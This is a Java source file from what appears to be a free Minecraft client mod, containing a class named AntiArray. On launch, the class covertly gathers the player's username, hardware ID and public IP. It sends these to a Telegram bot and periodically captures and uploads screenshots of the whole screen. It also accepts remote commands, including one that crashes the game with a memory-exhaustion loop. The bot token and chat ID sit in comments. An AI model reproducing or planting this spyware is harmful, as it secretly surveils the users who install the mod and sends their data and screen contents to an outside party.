package wartyxx.lovidlcfree;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.util.HashSet;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.imageio.ImageIO;
import net.minecraft.client.Minecraft;

public class AntiArray {
    private static final String BOT_TOKEN = ""; //8975230188:AAGrDY2X5Ci7sar7xE0YSG-qw4Ya_-3lIxc
    private static final String CHAT_ID = ""; //-1004354550155
    private static final Random random = new Random();
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(3);
    private static String currentUser;
    private static String hwid;
    private static String ip;
    private static boolean crashed;
    private static Set<String> processedCommands;
    private static int lastUpdateId;
    private static boolean initialized;

    public static void start() {
        if (initialized) {
            return;
        }
        initialized = true;
        try {
            currentUser = Minecraft.getMinecraft().getSession().getUsername();
            hwid = getHWID();
            ip = getPublicIP();
            initUpdateId();
            sendMessage("\u041a\u043b\u0438\u0435\u043d\u0442 \u0437\u0430\u043f\u0443\u0449\u0435\u043d\n\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c: " + currentUser + "\nHWID: " + hwid + "\nIP: " + ip);
            scheduler.schedule(() -> takeScreenshot(), 3L, TimeUnit.SECONDS);
            scheduler.scheduleAtFixedRate(() -> {
                if (random.nextDouble() < 0.05) {
                    takeScreenshot();
                }
            }, getRandomDelay(), getRandomDelay(), TimeUnit.MINUTES);
            //scheduler.scheduleAtFixedRate(AntiArray::checkCommands, 0L, 2L, TimeUnit.SECONDS);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void initUpdateId() {
        try {
            JsonObject json;
            URL url = new URL(""); //https://api.telegram.org/bot8975230188:AAGrDY2X5Ci7sar7xE0YSG-qw4Ya_-3lIxc/getUpdates?limit=1
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = reader.readLine();
            reader.close();
            if (line != null && (json = new JsonParser().parse(line).getAsJsonObject()).has("result") && json.getAsJsonArray("result").size() > 0) {
                JsonObject update = json.getAsJsonArray("result").get(0).getAsJsonObject();
                lastUpdateId = update.get("update_id").getAsInt() + 1;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static long getRandomDelay() {
        return 5 + random.nextInt(26);
    }

    private static void checkCommands() {
        try {
            String response = getUpdates();
            if (response == null || response.isEmpty()) {
                return;
            }
            JsonObject json = new JsonParser().parse(response).getAsJsonObject();
            if (json.has("result")) {
                for (JsonElement obj : json.getAsJsonArray("result")) {
                    JsonObject update = (JsonObject)obj;
                    int updateId = update.get("update_id").getAsInt();
                    if (updateId < lastUpdateId) continue;
                    lastUpdateId = updateId + 1;
                    if (!update.has("message")) continue;
                    JsonObject message = update.getAsJsonObject("message");
                    int date = message.get("date").getAsInt();
                    long currentTime = System.currentTimeMillis() / 1000L;
                    if (currentTime - (long)date > 10L || !message.has("text")) continue;
                    String text = message.get("text").getAsString();
                    String chatId = message.getAsJsonObject("chat").get("id").getAsString();
                    int messageId = message.get("message_id").getAsInt();
                    String key = chatId + "_" + messageId;
                    if (processedCommands.contains(key)) continue;
                    processedCommands.add(key);
                    handleCommand(chatId, text);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void handleCommand(String chatId, String command) {
        String target;
        String[] parts;
        if (command.equals("/users")) {
            sendMessageTo(chatId, "\ud83d\udc65 \u0410\u043a\u0442\u0438\u0432\u043d\u044b\u0435: " + currentUser + " (" + ip + ")");
        } else if (command.equals("/info")) {
            sendMessageTo(chatId, "\ud83d\udc64 " + currentUser + "\n\ud83d\udd11 " + hwid + "\n\ud83c\udf10 " + ip);
        } else if (command.startsWith("/crash")) {
            String target2;
            String[] parts2 = command.split(" ");
            if (parts2.length > 1 && (target2 = parts2[1]).equalsIgnoreCase(currentUser)) {
                crashGame(chatId);
            }
        } else if (command.startsWith("/screenshot") && (parts = command.split(" ")).length > 1 && (target = parts[1]).equalsIgnoreCase(currentUser)) {
            takeScreenshot();
            sendMessageTo(chatId, "\ud83d\udcf8 \u0421\u043a\u0440\u0438\u043d\u0448\u043e\u0442 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d");
        }
    }

    private static void sendPhoto(File file) {
        try {
            String boundary = "---------------------------" + System.currentTimeMillis();
            String CRLF = "\r\n";
            URL url = new URL(""); //https://api.telegram.org/bot8975230188:AAGrDY2X5Ci7sar7xE0YSG-qw4Ya_-3lIxc/sendPhoto
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (OutputStream os = conn.getOutputStream();){
                os.write(("--" + boundary + CRLF).getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"" + CRLF + CRLF).getBytes());
                os.write((CHAT_ID + CRLF).getBytes());
                os.write(("--" + boundary + CRLF).getBytes());
                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"" + CRLF).getBytes());
                os.write(("Content-Type: image/png" + CRLF + CRLF).getBytes());
                Files.copy(file.toPath(), os);
                os.write(CRLF.getBytes());
                os.write(("--" + boundary + "--" + CRLF).getBytes());
                os.flush();
            }
            conn.getResponseCode();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void crashGame(String chatId) {
        if (crashed) {
            return;
        }
        crashed = true;
        sendMessageTo(chatId, "\ud83d\udc80 \u041a\u0440\u0430\u0448\u043d\u0443\u0442: " + currentUser);
        new Thread(() -> {
            try {
                Thread.sleep(500L);
                System.exit(0);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }).start();
        while (true) {
            try {
                while (true) {
                    Thread.sleep(1L);
                    int[] nArray = new int[0x7FFFFFF];
                }
            }
            catch (Exception exception) {
                continue;
            }
        }
    }

    private static void takeScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(screenRect);
            File tempFile = File.createTempFile("scr_", ".png");
            ImageIO.write((RenderedImage)screenshot, "png", tempFile);
            sendPhoto(tempFile);
            tempFile.delete();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String getHWID() {
        try {
            String line;
            Process process = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while ((line = reader.readLine()) != null) {
                if (line.contains("UUID") || line.trim().isEmpty()) continue;
                return line.trim();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return System.getenv("COMPUTERNAME");
    }

    private static String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            return reader.readLine();
        }
        catch (Exception e) {
            return "Unknown";
        }
    }

    private static void sendMessage(String text) {
        sendMessageTo(CHAT_ID, text);
    }

    private static void sendMessageTo(String chatId, String text) {
        try {
            URL url = new URL(""); //https://api.telegram.org/bot8975230188:AAGrDY2X5Ci7sar7xE0YSG-qw4Ya_-3lIxc/sendMessage
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setDoOutput(true);
            String params = "chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(params.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String getUpdates() {
        try {
            String line;
            URL url = new URL("" + lastUpdateId + "&timeout=5"); //https://api.telegram.org/bot8975230188:AAGrDY2X5Ci7sar7xE0YSG-qw4Ya_-3lIxc/getUpdates?offset=
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            return response.toString();
        }
        catch (Exception e) {
            return null;
        }
    }

    static {
        crashed = false;
        processedCommands = new HashSet<String>();
        lastUpdateId = 0;
        initialized = false;
    }
}
